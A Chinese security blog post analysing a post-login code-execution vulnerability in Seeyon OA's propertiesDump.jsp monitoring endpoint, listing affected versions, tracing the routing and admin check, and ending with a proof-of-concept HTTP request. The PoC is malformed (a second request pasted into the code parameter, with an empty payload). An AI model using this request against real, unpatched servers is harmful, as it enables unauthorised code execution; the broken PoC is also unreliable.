致远oa代码审计系列八-后台监控命令执行漏洞分析
========================

原创 作者:archive 公号:安全回忆录 发布时间:2023-12-11 22:03 发表于北京

原文地址：[致远oa代码审计系列八-后台监控命令执行漏洞分析](https://mp.weixin.qq.com/s/YA1bx0c0DcAZjlVV--kL0A)

**漏洞描述:**

致远OA登录后用户可通过监控功能，后台监控功能没有对用户传入参数进行任何过滤检测,存在代码执行漏洞。该漏洞为后台漏洞, 无法配合致远OA代码审计系列二中提到的权限绕过进行利用,为后台漏洞。

******适用版本:******

G6\_V5.6SP1,V5.6,V5.70,V5.71,V5.71SP1,V5.80,V5.80sp1&G6N\_V3.0,V3.0sp1、V5&G6\_V5.6至V8.0SP2全系列版本、V5&G6&N\_V8.1至V8.1SP1全系列版本。

**漏洞分析:**

漏洞位置:propertiesDump.jsp, 当传入的action参数为downloadTest时 ,会将code参数直接带入ScriptEvaluator.eval中, 造成代码执行漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuHk1AGrynWPdDNG6ibcas2Krpia7wm9W6AXaUIbrGs2M22aSmDR1WPkQ7vctGwIRKVydyVKxXRe3NA/640?wx_fmt=png&from=appmsg)

全局搜索propertiesDump发现在spring-sysmgr-controller.xml中有如下配置:

```javascript
<bean name="/ctp/sysmgr/monitor/propertiesDump.do" class="org.springframework.web.servlet.mvc.CTPUrlFilenameViewController" />
```

所有的监控路由都是通过CTPUrlFilenameViewController控制器,查看该控制器发现继承了Spring Framework的UrlFilenameViewController 类，重写了其中的 getViewNameForRequest方法,根据条件返回不同的视图名称，从而实现定制化的视图解析逻辑。该类的主要作用是根据请求的 URI来确定视图。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuHk1AGrynWPdDNG6ibcas2KG5uBmvscChTw9KiaVibScx7s7Jnibutgrm7BQyqJwEaGeZo93ZIbiapOFQ/640?wx_fmt=png&from=appmsg)

查找视图解析器的配置,Spring MVC 在解析视图时会在 /WEB-INF/jsp/ 目录下寻找以 .jsp 结尾的文件。

在CTPUrlFilenameViewController中会通过extractViewNameFromUrlPath从 URL 路径中提取视图名称。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuHk1AGrynWPdDNG6ibcas2KLYSFibT0Ubb6OwOguaibmuSeXertWo7Sy3bn5dsfPzds4R3rNANTrymw/640?wx_fmt=png&from=appmsg)

所以构造路由:/seeyon/ctp/sysmgr/monitor/propertiesDump.do?action=downloadTest即可访问到该jsp文件。

在返回视图之前会判断OrgHelper.hasAdminResouceCode("system\_monitor")

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuHk1AGrynWPdDNG6ibcas2Kx4lAGW0POJP6FnOAUcZBvZlhiankABdIBZxySKQU1YLEGJVQYoG5y0A/640?wx_fmt=png&from=appmsg)

当非管理员访问时会直接返回404,由于这里进行了一次权限校验, 导致之提到的权限绕过无法直接利用。

最终利用路径

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuHk1AGrynWPdDNG6ibcas2K7Bpk1TAfE9Kf3PdscV2ACjddTUGysNnicUPBuGHolaOWiaRq3dW2b1ibA/640?wx_fmt=png&from=appmsg)

最终利用poc:  

```http
POST /seeyon/ctp/sysmgr/monitor/propertiesDump.do?action=downloadTest HTTP/1.1
Host: 192.168.246.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.246.4/seeyon/main.do?method=main&fl=1&switchToAdmin=1
Cookie: JSESSIONID=4DA49B9786097DF96AFA43A0A1945086; login_locale=zh_CN; avatarImageUrl=3003611276195810894; loginPageURL=
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3117


code=POST /seeyon/ctp/sysmgr/monitor/propertiesDump.do?action=downloadTest HTTP/1.1
Host: 192.168.246.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.246.4/seeyon/main.do?method=main&fl=1&switchToAdmin=1
Cookie: JSESSIONID=B111C882C1973B2E637790C02915F0F8; login_locale=zh_CN; avatarImageUrl=7194165855106450215; loginPageURL=
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2524


code=
```

**总结:**

该漏洞为后台漏洞,后台监控功能没有对用户传入参数进行任何过滤检测导致, 致远官方于2022年8月5日发布补丁修复该漏洞。